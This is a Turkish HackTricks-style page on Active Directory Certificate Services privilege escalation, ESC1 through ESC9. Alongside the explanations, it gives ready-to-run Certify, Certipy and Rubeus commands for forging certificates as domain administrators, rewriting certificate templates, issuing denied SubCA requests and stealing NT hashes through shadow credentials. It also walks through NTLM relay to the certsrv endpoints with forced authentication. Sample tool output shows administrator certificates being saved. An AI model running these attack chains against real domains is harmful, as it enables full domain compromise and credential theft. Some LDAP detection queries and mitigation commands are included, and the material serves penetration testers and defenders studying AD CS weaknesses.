# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}

**Bu, gönderilerin yükselme teknikleri bölümlerinin bir özetidir:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Yanlış Yapılandırılmış Sertifika Şablonları - ESC1

### Açıklama

### Yanlış Yapılandırılmış Sertifika Şablonları - ESC1 Açıklaması

- **Kayıt hakları, Kurumsal CA tarafından düşük ayrıcalıklı kullanıcılara verilmektedir.**
- **Yönetici onayı gerekmemektedir.**
- **Yetkili personelden imza gerekmemektedir.**
- **Sertifika şablonlarındaki güvenlik tanımlayıcıları aşırı izinlidir, bu da düşük ayrıcalıklı kullanıcıların kayıt hakları elde etmesine olanak tanır.**
- **Sertifika şablonları, kimlik doğrulamayı kolaylaştıran EKU'ları tanımlamak için yapılandırılmıştır:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) veya no EKU (SubCA) gibi Genişletilmiş Anahtar Kullanımı (EKU) tanımlayıcıları dahildir.
- **Talep edenlerin Sertifika İmzalama Talebinde (CSR) subjectAltName'ı dahil etme yeteneği şablon tarafından izin verilmektedir:**
- Active Directory (AD), kimlik doğrulama için bir sertifikada subjectAltName (SAN) varsa bunu önceliklendirir. Bu, CSR'de SAN belirterek, herhangi bir kullanıcıyı (örneğin, bir alan yöneticisi) taklit etmek için bir sertifika talep edilebileceği anlamına gelir. Talep edenin bir SAN belirleyip belirleyemeyeceği, sertifika şablonunun AD nesnesinde `mspki-certificate-name-flag` özelliği aracılığıyla belirtilir. Bu özellik bir bitmask'tır ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağının varlığı, talep edenin SAN'ı belirtmesine izin verir.

> [!CAUTION]
> Belirtilen yapılandırma, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile sertifika talep etmelerine izin verir, bu da Kerberos veya SChannel aracılığıyla herhangi bir alan ilkesinin kimliğini doğrulamalarını sağlar.

Bu özellik, bazen ürünler veya dağıtım hizmetleri tarafından HTTPS veya ana bilgisayar sertifikalarının anında oluşturulmasını desteklemek için veya bir anlayış eksikliği nedeniyle etkinleştirilir.

Bu seçeneği kullanarak bir sertifika oluşturmanın bir uyarı tetiklediği, mevcut bir sertifika şablonunun (örneğin, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan `WebServer` şablonu) kopyalanıp ardından bir kimlik doğrulama OID'si eklemek için değiştirilmesi durumunda böyle bir uyarının tetiklenmediği belirtilmiştir.

### Suistimal

**Zayıf sertifika şablonlarını bulmak için** şunu çalıştırabilirsiniz:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Bu **açığı kötüye kullanarak bir yöneticiyi taklit etmek** için şunları çalıştırabilirsiniz:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Sonra oluşturulan **sertifikayı `.pfx`** formatına dönüştürebilir ve bunu **Rubeus veya certipy** kullanarak tekrar **kimlik doğrulamak için** kullanabilirsiniz:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows ikili dosyaları "Certreq.exe" ve "Certutil.exe", PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Ormanı'nın yapılandırma şemasındaki sertifika şablonlarının, özellikle onay veya imza gerektirmeyen, Client Authentication veya Smart Card Logon EKU'suna sahip olan ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağı etkin olanların listelenmesi, aşağıdaki LDAP sorgusunu çalıştırarak gerçekleştirilebilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Yanlış Yapılandırılmış Sertifika Şablonları - ESC2

### Açıklama

İkinci kötüye kullanım senaryosu, birincisinin bir varyasyonudur:

1. Kayıt hakları, Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.
2. Yönetici onayı gereksinimi devre dışı bırakılır.
3. Yetkili imzaların gerekliliği atlanır.
4. Sertifika şablonundaki aşırı izinli bir güvenlik tanımlayıcısı, düşük ayrıcalıklı kullanıcılara sertifika kayıt hakları verir.
5. **Sertifika şablonu, Any Purpose EKU'yu veya hiç EKU'yu içerecek şekilde tanımlanmıştır.**

**Any Purpose EKU**, bir saldırganın **herhangi bir amaç** için, istemci kimlik doğrulaması, sunucu kimlik doğrulaması, kod imzalama vb. dahil olmak üzere bir sertifika almasına izin verir. Bu senaryoyu istismar etmek için **ESC3 için kullanılan aynı teknik** uygulanabilir.

**Hiç EKU'su olmayan** sertifikalar, alt CA sertifikaları olarak hareket eder ve **herhangi bir amaç** için istismar edilebilir ve **yeni sertifikaları imzalamak için de kullanılabilir**. Bu nedenle, bir saldırgan, bir alt CA sertifikası kullanarak yeni sertifikalarda keyfi EKU'lar veya alanlar belirtebilir.

Ancak, **alan kimlik doğrulaması** için oluşturulan yeni sertifikalar, alt CA **`NTAuthCertificates`** nesnesi tarafından güvenilir değilse çalışmayacaktır; bu, varsayılan ayardır. Yine de, bir saldırgan **herhangi bir EKU** ve keyfi sertifika değerleri ile **yeni sertifikalar** oluşturabilir. Bunlar, potansiyel olarak geniş bir yelpazede amaçlar için **kötüye kullanılabilir** (örneğin, kod imzalama, sunucu kimlik doğrulaması vb.) ve SAML, AD FS veya IPSec gibi ağdaki diğer uygulamalar için önemli sonuçlar doğurabilir.

AD Ormanı'nın yapılandırma şemasında bu senaryoya uyan şablonları listelemek için aşağıdaki LDAP sorgusu çalıştırılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Yanlış Yapılandırılmış Kayıt Ajanı Şablonları - ESC3

### Açıklama

Bu senaryo, birincisi ve ikincisi gibi ancak **farklı bir EKU** (Sertifika Talep Ajanı) ve **2 farklı şablon** **istismar ederek** (bu nedenle 2 set gereksinimi vardır),

**Sertifika Talep Ajanı EKU** (OID 1.3.6.1.4.1.311.20.2.1), Microsoft belgelerinde **Kayıt Ajanı** olarak bilinir, bir kullanıcının **başka bir kullanıcı adına** **sertifika** için **kayıt olmasına** izin verir.

**“kayıt ajanı”** böyle bir **şablona** kayıt olur ve elde edilen **sertifikayı diğer kullanıcı adına bir CSR'yi eş-imzalamak için** kullanır. Daha sonra **eş-imzalı CSR'yi** CA'ya **gönderir**, **“başka birinin adına kayıt olma”** izni veren bir **şablona** kayıt olur ve CA, **“diğer” kullanıcıya ait bir sertifika** ile yanıt verir.

**Gereksinimler 1:**

- Kayıt hakları, Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.
- Yönetici onayı gereksinimi atlanmıştır.
- Yetkili imzalar için bir gereksinim yoktur.
- Sertifika şablonunun güvenlik tanımlayıcısı aşırı derecede izin vericidir, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
- Sertifika şablonu, diğer ilkeler adına diğer sertifika şablonlarının talep edilmesini sağlayan Sertifika Talep Ajanı EKU'sunu içerir.

**Gereksinimler 2:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
- Yönetici onayı atlanmıştır.
- Şablonun şema versiyonu ya 1'dir ya da 2'yi aşar ve Sertifika Talep Ajanı EKU'sunu gerektiren bir Uygulama Politikası Yayınlama Gereksinimi belirtir.
- Sertifika şablonunda tanımlanan bir EKU, alan kimlik doğrulamasına izin verir.
- Kayıt ajanları için kısıtlamalar CA üzerinde uygulanmamaktadır.

### İstismar

Bu senaryoyu istismar etmek için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Kullanıcılar**, **kayıt ajanı sertifikası** **edinme** iznine sahip olanlar, kayıt **ajanlarının** kayıt olmasına izin verilen şablonlar ve kayıt ajanının hareket edebileceği **hesaplar**, kurumsal CA'lar tarafından kısıtlanabilir. Bu, `certsrc.msc` **snap-in**'ini açarak, **CA'ya sağ tıklayarak**, **Özellikler**'i tıklayarak ve ardından “Enrollment Agents” sekmesine **geçerek** gerçekleştirilir.

Ancak, CA'lar için **varsayılan** ayarın “**Kayıt ajanlarını kısıtlamayın**” olduğu belirtilmektedir. Kayıt ajanları üzerindeki kısıtlama, yöneticiler tarafından etkinleştirildiğinde, “Kayıt ajanlarını kısıtla” olarak ayarlandığında, varsayılan yapılandırma son derece izin verici kalır. **Herkes**'in herhangi biri olarak tüm şablonlara kayıt olmasına izin verir.

## Savunmasız Sertifika Şablonu Erişim Kontrolü - ESC4

### **Açıklama**

**Sertifika şablonları** üzerindeki **güvenlik tanımlayıcı** belirli **AD ilkeleri** tarafından şablonla ilgili sahip olunan **izinleri** tanımlar.

Eğer bir **saldırgan**, bir **şablonu** **değiştirmek** ve **önceki bölümlerde** belirtilen herhangi bir **istismar edilebilir yanlış yapılandırmayı** **kurmak** için gerekli **izinlere** sahipse, ayrıcalık yükseltmesi sağlanabilir.

Sertifika şablonlarına uygulanabilir önemli izinler şunlardır:

- **Sahip:** Nesne üzerinde örtük kontrol sağlar, herhangi bir niteliği değiştirme yetkisi verir.
- **TamKontrol:** Nesne üzerinde tam yetki sağlar, herhangi bir niteliği değiştirme yeteneği dahil.
- **SahibiYaz:** Nesnenin sahibini saldırganın kontrolündeki bir ilkeye değiştirme izni verir.
- **DaclYaz:** Erişim kontrollerinin ayarlanmasına izin verir, potansiyel olarak bir saldırgana TamKontrol verebilir.
- **ÖzellikYaz:** Herhangi bir nesne özelliğinin düzenlenmesine yetki verir.

### Suistimal

Önceki gibi bir ayrıcalık yükseltme örneği:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının bir sertifika şablonu üzerinde yazma ayrıcalıklarına sahip olduğu durumdur. Bu, örneğin, sertifika şablonunun yapılandırmasını değiştirmek için suistimal edilebilir ve şablonu ESC1'e karşı savunmasız hale getirebilir.

Yukarıdaki yolda görüldüğü gibi, yalnızca `JOHNPC` bu ayrıcalıklara sahiptir, ancak kullanıcı `JOHN`'ın `JOHNPC`'ye yeni `AddKeyCredentialLink` kenarı vardır. Bu teknik sertifikalarla ilgili olduğundan, bu saldırıyı da uyguladım, bu da [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinir. İşte kurbanın NT hash'ini almak için Certipy'nin `shadow auto` komutunun küçük bir önizlemesi.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**, bir sertifika şablonunun yapılandırmasını tek bir komutla geçersiz kılabilir. **Varsayılan olarak**, Certipy yapılandırmayı **ESC1'e karşı savunmasız hale getirecek şekilde** **geçersiz kılar**. Ayrıca, **saldırımızdan sonra yapılandırmayı geri yüklemek için eski yapılandırmayı kaydetmek üzere `-save-old` parametresini belirtebiliriz**.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

Birçok nesneyi, sertifika şablonları ve sertifika otoritesinin ötesinde, içeren geniş ACL tabanlı ilişkiler ağı, tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilecek bu nesneler şunlardır:

- S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla tehlikeye girebilecek CA sunucusunun AD bilgisayar nesnesi.
- CA sunucusunun RPC/DCOM sunucusu.
- `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` belirli konteyner yolundaki herhangi bir alt AD nesnesi veya konteyner. Bu yol, Sertifika Şablonları konteyneri, Sertifikasyon Otoriteleri konteyneri, NTAuthCertificates nesnesi ve Kayıt Hizmetleri Konteyneri gibi konteynerler ve nesnelerle sınırlı olmamakla birlikte, bunları içerir.

PKI sisteminin güvenliği, düşük ayrıcalıklı bir saldırgan bu kritik bileşenlerden herhangi birine kontrol sağlamayı başarırsa tehlikeye girebilir.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

[**CQure Academy gönderisinde**](https://cqureacademy.com/blog/enhanced-key-usage) tartışılan konu, Microsoft tarafından belirtilen **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağının etkilerini de kapsamaktadır. Bu yapılandırma, bir Sertifikasyon Otoritesi (CA) üzerinde etkinleştirildiğinde, **herhangi bir talep** için **kullanıcı tanımlı değerlerin** **alternatif ad** olarak dahil edilmesine izin verir; bu, Active Directory®'den oluşturulanları da içerir. Sonuç olarak, bu düzenleme, bir **saldırganın** **herhangi bir şablon** aracılığıyla alan **kimlik doğrulaması** için kaydolmasına olanak tanır—özellikle, standart Kullanıcı şablonu gibi **ayrıcalıksız** kullanıcı kaydına açık olanlar. Sonuç olarak, bir sertifika güvence altına alınabilir ve saldırganın alan yöneticisi veya alan içindeki **herhangi bir aktif varlık** olarak kimlik doğrulaması yapmasına olanak tanır.

**Not**: `certreq.exe` içindeki `-attrib "SAN:"` argümanı aracılığıyla bir Sertifika İmzalama Talebine (CSR) **alternatif adların** eklenmesi yaklaşımı, ESC1'deki SAN'ların istismar stratejisinden bir **fark** sunar. Burada, fark, **hesap bilgilerinin nasıl kapsüllendiği** ile ilgilidir—bir sertifika niteliği içinde, bir uzantı yerine.

### Abuse

Ayarın etkin olup olmadığını doğrulamak için, kuruluşlar `certutil.exe` ile aşağıdaki komutu kullanabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Bu işlem esasen **uzaktan kayıt defteri erişimi** kullanır, bu nedenle alternatif bir yaklaşım şu olabilir:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) gibi araçlar bu yanlış yapılandırmayı tespit etme ve bunu istismar etme yeteneğine sahiptir:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Bu ayarları değiştirmek için, **domain yönetici** haklarına veya eşdeğerine sahip olunduğu varsayılarak, aşağıdaki komut herhangi bir iş istasyonundan çalıştırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Bu yapılandırmayı ortamınızda devre dışı bırakmak için, bayrak şu şekilde kaldırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> May 2022 güvenlik güncellemelerinden sonra, yeni verilen **sertifikalar**, **istek sahibinin `objectSid` özelliğini** içeren bir **güvenlik uzantısı** içerecektir. ESC1 için, bu SID belirtilen SAN'dan türetilir. Ancak, **ESC6** için, SID **istek sahibinin `objectSid`** değerini yansıtır, SAN'ı değil.\
> ESC6'yi istismar etmek için, sistemin ESC10'a (Zayıf Sertifika Eşleştirmeleri) karşı hassas olması gerekmektedir; bu, **yeni güvenlik uzantısından ziyade SAN'ı** önceliklendirir.

## Zayıf Sertifika Otoritesi Erişim Kontrolü - ESC7

### Saldırı 1

#### Açıklama

Bir sertifika otoritesinin erişim kontrolü, CA eylemlerini yöneten bir dizi izin aracılığıyla sürdürülmektedir. Bu izinler, `certsrv.msc` erişilerek, bir CA'ya sağ tıklanarak, özellikler seçilerek ve ardından Güvenlik sekmesine gidilerek görüntülenebilir. Ayrıca, izinler PSPKI modülü kullanılarak şu komutlarla sıralanabilir:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Bu, "CA yöneticisi" ve "Sertifika Yöneticisi" rollerine karşılık gelen **`ManageCA`** ve **`ManageCertificates`** gibi temel haklar hakkında bilgiler sunar.

#### Kötüye Kullanım

Bir sertifika otoritesinde **`ManageCA`** haklarına sahip olmak, yetkilinin PSPKI kullanarak ayarları uzaktan manipüle etmesine olanak tanır. Bu, herhangi bir şablonda SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağını açmayı içerir; bu, alan yükseltmesinin kritik bir yönüdür.

Bu sürecin basitleştirilmesi, doğrudan GUI etkileşimi olmadan değişikliklere izin veren PSPKI’nin **Enable-PolicyModuleFlag** cmdlet'i kullanılarak gerçekleştirilebilir.

**`ManageCertificates`** haklarına sahip olmak, bekleyen taleplerin onaylanmasını kolaylaştırır ve "CA sertifika yöneticisi onayı" korumasını etkili bir şekilde aşar.

Bir **Certify** ve **PSPKI** modülleri kombinasyonu, bir sertifika talep etmek, onaylamak ve indirmek için kullanılabilir:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.

Bu nedenle, burada başka bir saldırı sunulmaktadır.

Gereksinimler:

- Sadece **`ManageCA` izni**
- **`Manage Certificates`** izni ( **`ManageCA`** üzerinden verilebilir)
- Sertifika şablonu **`SubCA`** **etkin** olmalıdır ( **`ManageCA`** üzerinden etkinleştirilebilir)

Teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız sertifika talepleri** verebileceği gerçeğine dayanır. **`SubCA`** sertifika şablonu **ESC1'e** **duyarlıdır**, ancak **sadece yöneticiler** şablona kaydolabilir. Bu nedenle, bir **kullanıcı** **`SubCA`**'ya kaydolmak için **talep** edebilir - bu **reddedilecektir** - ancak **sonrasında yönetici tarafından verilecektir**.

#### Abuse

Kendinize **`Manage Certificates`** erişim hakkını, kullanıcıyı yeni bir yetkili olarak ekleyerek **verebilirsiniz**.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** şablonu, `-enable-template` parametresi ile CA üzerinde **etkinleştirilebilir**. Varsayılan olarak, `SubCA` şablonu etkindir.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Bu saldırı için ön koşulları yerine getirdiysek, **`SubCA` şablonuna dayalı bir sertifika talep etmeye başlayabiliriz**.

**Bu talep reddedilecektir**, ancak özel anahtarı kaydedeceğiz ve talep kimliğini not alacağız.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` ve `Manage Certificates`** ile, `ca` komutunu ve `-issue-request <request ID>` parametresini kullanarak **başarısız sertifika** talebini **verebiliriz**.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Ve nihayet, **verilen sertifikayı** `req` komutu ve `-retrieve <request ID>` parametresi ile **alabiliriz**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Açıklama

> [!TIP]
> **AD CS yüklü** olan ortamlarda, eğer **web kayıt noktası zayıf** ise ve en az bir **sertifika şablonu yayınlanmışsa** ve **alan bilgisayarı kaydı ve istemci kimlik doğrulaması** (varsayılan **`Machine`** şablonu gibi) izin veriyorsa, **spooler servisi aktif olan herhangi bir bilgisayarın bir saldırgan tarafından tehlikeye atılması mümkün hale gelir**!

AD CS tarafından desteklenen birkaç **HTTP tabanlı kayıt yöntemi** bulunmaktadır ve bunlar yöneticilerin yükleyebileceği ek sunucu rolleri aracılığıyla sunulmaktadır. HTTP tabanlı sertifika kaydı için bu arayüzler **NTLM relay saldırılarına** karşı hassastır. Bir saldırgan, **tehlikeye atılmış bir makineden, gelen NTLM aracılığıyla kimlik doğrulayan herhangi bir AD hesabını taklit edebilir**. Kurban hesabını taklit ederken, bu web arayüzleri bir saldırgan tarafından **`User` veya `Machine` sertifika şablonlarını kullanarak bir istemci kimlik doğrulama sertifikası talep etmek için erişilebilir**.

- **Web kayıt arayüzü** (`http://<caserver>/certsrv/` adresinde bulunan eski bir ASP uygulaması), varsayılan olarak yalnızca HTTP'ye ayarlanmıştır ve bu, NTLM relay saldırılarına karşı koruma sağlamaz. Ayrıca, yalnızca NTLM kimlik doğrulamasına izin vererek, Kerberos gibi daha güvenli kimlik doğrulama yöntemlerinin uygulanamaz hale gelmesine neden olur.
- **Sertifika Kayıt Servisi** (CES), **Sertifika Kayıt Politikası** (CEP) Web Servisi ve **Ağ Cihazı Kayıt Servisi** (NDES) varsayılan olarak, yetkilendirme HTTP başlıkları aracılığıyla müzakere kimlik doğrulamasını destekler. Müzakere kimlik doğrulaması **hem** Kerberos'u hem de **NTLM**'yi destekleyerek, bir saldırganın relay saldırıları sırasında **NTLM'ye düşürmesine** olanak tanır. Bu web hizmetleri varsayılan olarak HTTPS'yi etkinleştirse de, HTTPS tek başına **NTLM relay saldırılarına karşı koruma sağlamaz**. HTTPS hizmetleri için NTLM relay saldırılarından korunma, yalnızca HTTPS'nin kanal bağlama ile birleştirilmesi durumunda mümkündür. Ne yazık ki, AD CS, kanal bağlama için gerekli olan IIS'de Genişletilmiş Kimlik Doğrulama Korumasını etkinleştirmemektedir.

NTLM relay saldırılarındaki yaygın bir **sorun**, **NTLM oturumlarının kısa süresi** ve saldırganın **NTLM imzası gerektiren** hizmetlerle etkileşimde bulunamamasıdır.

Yine de, bu sınırlama, bir kullanıcı için bir sertifika edinmek amacıyla bir NTLM relay saldırısını kullanarak aşılmaktadır, çünkü sertifikanın geçerlilik süresi oturumun süresini belirler ve sertifika, **NTLM imzası zorunlu** olan hizmetlerle kullanılabilir. Çalınan bir sertifikanın nasıl kullanılacağına dair talimatlar için bakınız:

{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay saldırılarının bir diğer sınırlaması, **bir saldırgan kontrolündeki makinenin bir kurban hesabı tarafından kimlik doğrulaması yapılması gerektiğidir**. Saldırgan ya bekleyebilir ya da bu kimlik doğrulamasını **zorlamaya** çalışabilir:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Sömürü**

[**Certify**](https://github.com/GhostPack/Certify)’nin `cas` komutu, **etkin HTTP AD CS uç noktalarını** listeler:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` özelliği, kurumsal Sertifika Otoriteleri (CA'lar) tarafından Sertifika Kaydı Servisi (CES) uç noktalarını depolamak için kullanılır. Bu uç noktalar, **Certutil.exe** aracını kullanarak ayrıştırılabilir ve listelenebilir:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify ile Suistimal
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

Certipy tarafından varsayılan olarak `Machine` veya `User` şablonuna dayalı olarak bir sertifika talebi yapılır; bu, iletilen hesap adının `$` ile bitip bitmediğine bağlıdır. Alternatif bir şablonun belirtilmesi, `-template` parametresinin kullanılmasıyla sağlanabilir.

Daha sonra kimlik doğrulamasını zorlamak için [PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik kullanılabilir. Alan denetleyicileri ile çalışırken, `-template DomainController` belirtilmesi gereklidir.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Açıklama

Yeni değer **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) için **`msPKI-Enrollment-Flag`**, ESC9 olarak adlandırılır, bir sertifikada **yeni `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısının** gömülmesini engeller. Bu bayrak, `StrongCertificateBindingEnforcement` `1` (varsayılan ayar) olarak ayarlandığında önem kazanır; bu, `2` ayarıyla çelişir. ESC9'un yokluğu, gereksinimleri değiştirmeyeceğinden, Kerberos veya Schannel için daha zayıf bir sertifika eşlemesinin istismar edilebileceği senaryoların önemini artırır (ESC10'da olduğu gibi).

Bu bayrağın ayarının önemli hale geldiği koşullar şunlardır:

